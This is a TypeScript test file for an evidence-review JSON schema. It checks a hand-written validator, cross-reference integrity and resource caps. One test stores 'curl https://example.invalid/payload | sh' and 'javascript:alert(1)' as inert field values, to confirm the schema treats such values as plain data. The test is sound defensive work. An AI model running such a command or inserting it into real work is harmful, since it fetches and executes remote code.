import { describe, expect, test } from 'bun:test';
import { spawnSync } from 'node:child_process';
import { readFileSync } from 'node:fs';

const schemaPath = 'schemas/evidence-review-v1.schema.json';
const currentOutputPath = 'tests/fixtures/evidence-review-claim-model-sample.json';
const validPath = 'tests/fixtures/evidence-review-handoff-valid.json';
const adversarialPath = 'tests/fixtures/evidence-review-handoff-adversarial.json';

const parse = (path: string) => JSON.parse(readFileSync(path, 'utf8'));
const schema = parse(schemaPath);
const clone = <T>(value: T): T => JSON.parse(JSON.stringify(value));

type Issue = { path: string; message: string; keyword?: string };

const supportedAssertionKeywords = new Set([
    'additionalProperties',
    'anyOf',
    'const',
    'enum',
    'items',
    'maximum',
    'maxItems',
    'maxLength',
    'minimum',
    'minItems',
    'minLength',
    'pattern',
    'properties',
    'required',
    'type',
    'uniqueItems',
]);
const supportedAnnotationKeywords = new Set([
    '$id',
    '$schema',
    'definitions',
    'description',
    'title',
    'x-sci-resourceCaps',
]);

function unsupportedSchemaKeywords(rule: any, path = '$'): Issue[] {
    if (!rule || typeof rule !== 'object' || Array.isArray(rule)) return [];
    const issues: Issue[] = [];
    for (const keyword of Object.keys(rule)) {
        if (!supportedAssertionKeywords.has(keyword) && !supportedAnnotationKeywords.has(keyword)) {
            issues.push({ path, keyword, message: `unsupported schema keyword: ${keyword}` });
        }
    }
    for (const [name, child] of Object.entries(rule.properties || {})) {
        issues.push(...unsupportedSchemaKeywords(child, `${path}.properties.${name}`));
    }
    for (const [name, child] of Object.entries(rule.definitions || {})) {
        issues.push(...unsupportedSchemaKeywords(child, `${path}.definitions.${name}`));
    }
    (rule.anyOf || []).forEach((child: any, index: number) => {
        issues.push(...unsupportedSchemaKeywords(child, `${path}.anyOf[${index}]`));
    });
    if (rule.items) issues.push(...unsupportedSchemaKeywords(rule.items, `${path}.items`));
    return issues;
}

function stableJson(value: any): string {
    if (Array.isArray(value)) return `[${value.map(stableJson).join(',')}]`;
    if (value && typeof value === 'object') {
        return `{${Object.keys(value)
            .sort()
            .map((key) => `${JSON.stringify(key)}:${stableJson(value[key])}`)
            .join(',')}}`;
    }
    return JSON.stringify(value);
}

// The repository has no direct draft-07 validator dependency. This deliberately small
// evaluator covers every assertion keyword used by the canonical schema, avoiding a
// package/lockfile change while still exercising the checked-in machine contract.
function schemaIssues(rule: any, value: any, path = '$'): Issue[] {
    const issues: Issue[] = [];
    const fail = (keyword: string, message: string) => issues.push({ path, keyword, message });
    if (rule.anyOf && !rule.anyOf.some((candidate: any) => schemaIssues(candidate, value, path).length === 0)) {
        fail('anyOf', 'did not match any allowed shape');
    }
    if (Object.hasOwn(rule, 'const') && stableJson(value) !== stableJson(rule.const)) {
        fail('const', 'constant mismatch');
    }
    if (rule.enum && !rule.enum.some((candidate: any) => stableJson(candidate) === stableJson(value))) {
        fail('enum', 'value is outside the enum');
    }
    const actualType = Array.isArray(value) ? 'array' : value === null ? 'null' : typeof value;
    const typeMatches =
        rule.type === 'integer' ? actualType === 'number' && Number.isInteger(value) : actualType === rule.type;
    if (rule.type && !typeMatches) {
        fail('type', `expected ${rule.type}, got ${actualType}`);
        return issues;
    }
    if (actualType === 'object') {
        for (const key of rule.required || []) if (!Object.hasOwn(value, key)) fail('required', `missing ${key}`);
        if (rule.additionalProperties === false) {
            for (const key of Object.keys(value)) {
                if (!Object.hasOwn(rule.properties || {}, key)) {
                    issues.push({ path: `${path}.${key}`, keyword: 'additionalProperties', message: 'unknown field' });
                }
            }
        }
        for (const [key, childRule] of Object.entries(rule.properties || {})) {
            if (Object.hasOwn(value, key)) issues.push(...schemaIssues(childRule, value[key], `${path}.${key}`));
        }
    }
    if (actualType === 'array') {
        if (rule.minItems !== undefined && value.length < rule.minItems) fail('minItems', 'too few items');
        if (rule.maxItems !== undefined && value.length > rule.maxItems) fail('maxItems', 'too many items');
        if (rule.uniqueItems && new Set(value.map(stableJson)).size !== value.length) {
            fail('uniqueItems', 'duplicate item');
        }
        value.forEach((item: any, index: number) => {
            issues.push(...schemaIssues(rule.items, item, `${path}[${index}]`));
        });
    }
    if (actualType === 'string') {
        const length = [...value].length;
        if (rule.minLength !== undefined && length < rule.minLength) fail('minLength', 'string too short');
        if (rule.maxLength !== undefined && length > rule.maxLength) fail('maxLength', 'string too long');
        if (rule.pattern && !new RegExp(rule.pattern, 'u').test(value)) fail('pattern', 'unsafe or malformed string');
    }
    if (actualType === 'number') {
        if (rule.minimum !== undefined && value < rule.minimum) fail('minimum', 'number below minimum');
        if (rule.maximum !== undefined && value > rule.maximum) fail('maximum', 'number above maximum');
        if (rule.type === 'integer' && !Number.isInteger(value)) fail('type', 'number is not an integer');
    }
    return issues;
}

const validate = Object.assign(
    (value: unknown) => {
        validate.errors = [...unsupportedSchemaKeywords(schema), ...schemaIssues(schema, value)];
        return validate.errors.length === 0;
    },
    { errors: [] as Issue[] }
);

function referenceIssues(review: any): Issue[] {
    const issues: Issue[] = [];
    const ids = (items: any[]) => new Set(items.map((item) => item.id));
    const duplicateIds = (name: string, items: any[]) => {
        const seen = new Set<string>();
        for (const item of items) {
            if (seen.has(item.id)) issues.push({ path: name, message: `duplicate id: ${item.id}` });
            seen.add(item.id);
        }
    };
    const artifacts = ids(review.evidenceArtifacts);
    const limitations = ids(review.limitations);
    const claims = ids(review.claims);
    const boundaries = ids(review.authorityBoundaries);
    const decisions = ids(review.operatorDecisionPoints);
    const requireRefs = (path: string, refs: string[], targets: Set<string>) => {
        for (const ref of refs) if (!targets.has(ref)) issues.push({ path, message: `unresolved reference: ${ref}` });
    };

    duplicateIds('evidenceArtifacts', review.evidenceArtifacts);
    duplicateIds('limitations', review.limitations);
    duplicateIds('claims', review.claims);
    duplicateIds('authorityBoundaries', review.authorityBoundaries);
    duplicateIds('operatorDecisionPoints', review.operatorDecisionPoints);
    duplicateIds('handoffReadiness.gates', review.handoffReadiness.gates);
    for (const item of review.limitations) {
        requireRefs(`limitations.${item.id}.sourceArtifact`, [item.sourceArtifact], artifacts);
        requireRefs(`limitations.${item.id}.affectsClaims`, item.affectsClaims, claims);
        requireRefs(`limitations.${item.id}.affectsDecisionPoints`, item.affectsDecisionPoints, decisions);
    }
    for (const item of review.claims) {
        requireRefs(`claims.${item.id}.supportedBy`, item.supportedBy, artifacts);
        requireRefs(`claims.${item.id}.limitedBy`, item.limitedBy, limitations);
        requireRefs(`claims.${item.id}.authorityBoundaries`, item.authorityBoundaries, boundaries);
        requireRefs(`claims.${item.id}.operatorDecisionPoints`, item.operatorDecisionPoints, decisions);
    }
    for (const item of review.operatorDecisionPoints) {
        requireRefs(`operatorDecisionPoints.${item.id}.supportingClaims`, item.supportingClaims, claims);
        requireRefs(`operatorDecisionPoints.${item.id}.limitingClaims`, item.limitingClaims, claims);
    }
    return issues;
}

function resourceIssues(value: unknown): Issue[] {
    const caps = schema['x-sci-resourceCaps'];
    const issues: Issue[] = [];
    let items = 0;
    let stringCodePoints = 0;
    const bytes = Buffer.byteLength(JSON.stringify(value), 'utf8');
    if (bytes > caps.encodedBytes) issues.push({ path: '$', message: 'encoded byte cap exceeded' });
    const visit = (node: unknown, depth: number, path: string) => {
        if (depth > caps.maximumDepth) issues.push({ path, message: 'depth cap exceeded' });
        if (typeof node === 'string') {
            const length = [...node].length;
            stringCodePoints += length;
            if (length > caps.maximumStringCodePoints) issues.push({ path, message: 'string cap exceeded' });
            return;
        }
        if (Array.isArray(node)) {
            items += node.length;
            if (node.length > caps.maximumArrayItems) issues.push({ path, message: 'array cap exceeded' });
            node.forEach((item, index) => {
                visit(item, depth + 1, `${path}[${index}]`);
            });
            return;
        }
        if (node && typeof node === 'object') {
            const entries = Object.entries(node);
            items += entries.length;
            for (const [key, child] of entries) {
                stringCodePoints += [...key].length;
                visit(child, depth + 1, `${path}.${key}`);
            }
        }
    };
    visit(value, 1, '$');
    if (items > caps.maximumTotalItems) issues.push({ path: '$', message: 'total item cap exceeded' });
    if (stringCodePoints > caps.maximumTotalStringCodePoints) {
        issues.push({ path: '$', message: 'aggregate string cap exceeded' });
    }
    return issues;
}

function expectConforms(review: unknown) {
    expect(validate(review), JSON.stringify(validate.errors)).toBe(true);
    expect(referenceIssues(review)).toEqual([]);
    expect(resourceIssues(review)).toEqual([]);
}

describe('evidence review consumer handoff contract', () => {
    test('is a strict canonical draft-07 schema with explicit resource caps', () => {
        expect(schema.$schema).toBe('http://json-schema.org/draft-07/schema#');
        expect(schema.additionalProperties).toBe(false);
        expect(schema.properties.schema.const).toBe('semantic-code-intelligence.evidence_review.v1');
        expect(schema.required).toEqual(expect.arrayContaining(['claims', 'limitations', 'operatorDecisionPoints']));
        expect(schema['x-sci-resourceCaps']).toMatchObject({ encodedBytes: 1048576, maximumDepth: 32 });
    });

    test('evaluator inventories every schema keyword and evaluates anyOf siblings', () => {
        expect(unsupportedSchemaKeywords(schema)).toEqual([]);
        expect(unsupportedSchemaKeywords({ type: 'number', exclusiveMaximum: 3 })).toEqual([
            expect.objectContaining({ keyword: 'exclusiveMaximum' }),
        ]);
        expect(schemaIssues({ anyOf: [{ type: 'string' }], const: 'required-value' }, 'other-value')).toEqual([
            expect.objectContaining({ keyword: 'const' }),
        ]);
        expect(schemaIssues({ anyOf: [{ type: 'number' }], const: 'text' }, 'text')).toEqual([
            expect.objectContaining({ keyword: 'anyOf' }),
        ]);
    });

    test('uniqueItems uses JSON deep equality independent of object member order', () => {
        const rule = { type: 'array', uniqueItems: true, items: { type: 'object' } };
        const issues = schemaIssues(rule, [
            { id: 'same', detail: { first: 1, second: 2 } },
            { detail: { second: 2, first: 1 }, id: 'same' },
        ]);
        expect(issues).toEqual([expect.objectContaining({ keyword: 'uniqueItems' })]);
    });

    test('accepts the valid golden and current committed normalized producer output', () => {
        expectConforms(parse(validPath));
        expectConforms(parse(currentOutputPath));
    });

    test('validates live output from the current SCI normalization producer', () => {
        const result = spawnSync(
            'bun',
            [
                'run',
                'scripts/summarize-evidence-review.ts',
                '--input',
                'tests/fixtures/evidence-review-validation-plan-input.json',
                '--format',
                'json',
            ],
            { cwd: process.cwd(), encoding: 'utf8' }
        );
        expect(result.status, result.stderr).toBe(0);
        const produced = JSON.parse(result.stdout);
        expectConforms(produced);
        expect(produced).toEqual(parse(currentOutputPath));
    });

    test('normalizes current patch-check workflow evidence into the strict v1 consumer shape', () => {
        const result = spawnSync(
            'bun',
            [
                'run',
                'scripts/summarize-evidence-review.ts',
                '--input',
                'tests/fixtures/evidence-review-live-workflow-validation-plan-input.json',
                '--format',
                'json',
            ],
            { cwd: process.cwd(), encoding: 'utf8' }
        );
        expect(result.status, result.stderr).toBe(0);
        const produced = JSON.parse(result.stdout);
        expectConforms(produced);
        expect(produced.scope.risk).toEqual({ level: 'low', category: 'mixed_change' });
        expect(produced.commands.rationale).toEqual([
            'reason=fallback_unknown_change_shape; command=bun run typecheck; files=index.ts',
        ]);
        expect(produced.checks.commands).toEqual([{ command: 'true', ok: true }]);
        expect(produced.graphImpact).toMatchObject({
            seed: null,
            counts: { imports: 0, exports: 0, callers: 0, callees: 0 },
            callerContextCount: 0,
            hasImpactEvidence: false,
        });
    });

    test('preserves valid graph evidence without promoting malformed status data', () => {
        const result = spawnSync(
            'bun',
            [
                'run',
                'scripts/summarize-evidence-review.ts',
                '--input',
                'tests/fixtures/evidence-review-live-workflow-graph-validation-plan-input.json',
                '--format',
                'json',
            ],
            { cwd: process.cwd(), encoding: 'utf8' }
        );
        expect(result.status, result.stderr).toBe(0);
        const produced = JSON.parse(result.stdout);
        expectConforms(produced);
        expect(produced.graphImpact.evidence[0]).toEqual({
            edge: 'imports',
            count: 1,
            status: 'evidence',
            limitations: [],
        });
        expect(produced.graphImpact.evidence[1]).toEqual({
            edge: 'callers',
            count: 0,
            status: 'empty_or_unavailable',
            limitations: [],
        });
        expect(produced.graphImpact.hasImpactEvidence).toBe(false);
        expect(produced.graphImpact.limitations).toContain(
            'Graph normalization limitation: graph evidence[1] status rendered empty or unavailable.'
        );
        expect(produced.claims.find((claim: any) => claim.id === 'graph-limitations')?.status).toBe('weakened');
    });

    test('routes alpha-packet graph overrides through the same no-promotion normalization', () => {
        const result = spawnSync(
            'bun',
            [
                'run',
                'scripts/summarize-evidence-review.ts',
                '--input',
                'tests/fixtures/evidence-review-live-alpha-packet-input.json',
                '--format',
                'json',
            ],
            { cwd: process.cwd(), encoding: 'utf8' }
        );
        expect(result.status, result.stderr).toBe(0);
        const produced = JSON.parse(result.stdout);
        expectConforms(produced);
        expect(produced.source.kind).toBe('alpha_packet');
        expect(produced.graphImpact.evidence[0].status).toBe('evidence');
        expect(produced.graphImpact.evidence[1].status).toBe('empty_or_unavailable');
        expect(produced.graphImpact.hasImpactEvidence).toBe(false);
        expect(produced.graphImpact.limitations).toContain(
            'Graph normalization limitation: graph evidence[1] status rendered empty or unavailable.'
        );
    });

    test('rejects adversarial unknown fields, hostile terminal text, and dangling references', () => {
        const review = parse(adversarialPath);
        expect(validate(review)).toBe(false);
        expect(validate.errors?.some((error) => error.keyword === 'additionalProperties')).toBe(true);
        expect(validate.errors?.some((error) => error.keyword === 'pattern')).toBe(true);
        expect(referenceIssues(review).some((issue) => issue.message.includes('missing-artifact'))).toBe(true);
    });

    test('rejects every unknown field and enforces explicit null posture', () => {
        const unknown = clone(parse(validPath));
        unknown.outcome.unreviewed = true;
        expect(validate(unknown)).toBe(false);
        const omitted = clone(parse(validPath));
        delete omitted.verification.applied;
        expect(validate(omitted)).toBe(false);
        const explicitNull = clone(parse(validPath));
        explicitNull.verification.applied = null;
        expect(validate(explicitNull), JSON.stringify(validate.errors)).toBe(true);
    });

    test('enforces enums, identifier uniqueness, and cross-array reference integrity', () => {
        const badEnum = clone(parse(validPath));
        badEnum.claims[0].status = 'approved';
        expect(validate(badEnum)).toBe(false);
        const duplicates = clone(parse(validPath));
        duplicates.claims[1].id = duplicates.claims[0].id;
        expect(referenceIssues(duplicates).some((issue) => issue.message.includes('duplicate id'))).toBe(true);
        const dangling = clone(parse(validPath));
        dangling.limitations[0].affectsDecisionPoints = ['not-displayed'];
        expect(referenceIssues(dangling).some((issue) => issue.message.includes('not-displayed'))).toBe(true);
    });

    test('diagnoses every cross-array reference edge independently', () => {
        const cases: Array<[string, (review: any) => void]> = [
            [
                'limitations.graph-impact-limitation-1.sourceArtifact',
                (r) => (r.limitations[0].sourceArtifact = 'dangling'),
            ],
            [
                'limitations.graph-impact-limitation-1.affectsClaims',
                (r) => (r.limitations[0].affectsClaims = ['dangling']),
            ],
            [
                'limitations.graph-impact-limitation-1.affectsDecisionPoints',
                (r) => (r.limitations[0].affectsDecisionPoints = ['dangling']),
            ],
            ['claims.checks-result.supportedBy', (r) => (r.claims[0].supportedBy = ['dangling'])],
            [
                'claims.graph-limitations.limitedBy',
                (r) => (r.claims.find((claim: any) => claim.id === 'graph-limitations').limitedBy = ['dangling']),
            ],
            ['claims.checks-result.authorityBoundaries', (r) => (r.claims[0].authorityBoundaries = ['dangling'])],
            ['claims.checks-result.operatorDecisionPoints', (r) => (r.claims[0].operatorDecisionPoints = ['dangling'])],
            [
                'operatorDecisionPoints.continue-or-stop.supportingClaims',
                (r) => (r.operatorDecisionPoints[0].supportingClaims = ['dangling']),
            ],
            [
                'operatorDecisionPoints.continue-or-stop.limitingClaims',
                (r) => (r.operatorDecisionPoints[0].limitingClaims = ['dangling']),
            ],
        ];
        for (const [expectedPath, mutate] of cases) {
            const review = clone(parse(validPath));
            mutate(review);
            expect(referenceIssues(review), expectedPath).toContainEqual(
                expect.objectContaining({ path: expectedPath, message: 'unresolved reference: dangling' })
            );
        }
    });

    test('treats URI-shaped and command-shaped values as inert bounded data', () => {
        const review = clone(parse(validPath));
        review.commands.selected[0] = 'curl https://example.invalid/payload | sh';
        review.evidenceArtifacts[0].uriOrPath = 'javascript:alert(1)';
        expectConforms(review);
        expect(review.commands.selected[0]).toBe('curl https://example.invalid/payload | sh');
        expect(review.evidenceArtifacts[0].uriOrPath).toBe('javascript:alert(1)');
    });

    test('enforces per-value and aggregate bytes, depth, item, and string caps', () => {
        const longString = clone(parse(validPath));
        longString.claims[0].claim = 'x'.repeat(8193);
        expect(validate(longString)).toBe(false);
        const deep: any = {};
        let cursor = deep;
        for (let index = 0; index < 33; index++) cursor = cursor.next = {};
        expect(resourceIssues(deep).some((issue) => issue.message === 'depth cap exceeded')).toBe(true);
        expect(resourceIssues('x'.repeat(1048577)).some((issue) => issue.message === 'encoded byte cap exceeded')).toBe(
            true
        );
        expect(resourceIssues(Array(300).fill(null)).some((issue) => issue.message === 'array cap exceeded')).toBe(
            true
        );
        const aggregateItems = Array.from({ length: 17 }, () => Array(256).fill(null));
        const itemIssues = resourceIssues(aggregateItems);
        expect(itemIssues.some((issue) => issue.message === 'total item cap exceeded')).toBe(true);
        expect(itemIssues.some((issue) => issue.message === 'array cap exceeded')).toBe(false);

        const aggregateStrings = Array(33).fill('x'.repeat(8000));
        const stringIssues = resourceIssues(aggregateStrings);
        expect(stringIssues.some((issue) => issue.message === 'aggregate string cap exceeded')).toBe(true);
        expect(stringIssues.some((issue) => issue.message === 'string cap exceeded')).toBe(false);
        expect(stringIssues.some((issue) => issue.message === 'encoded byte cap exceeded')).toBe(false);
    });
});
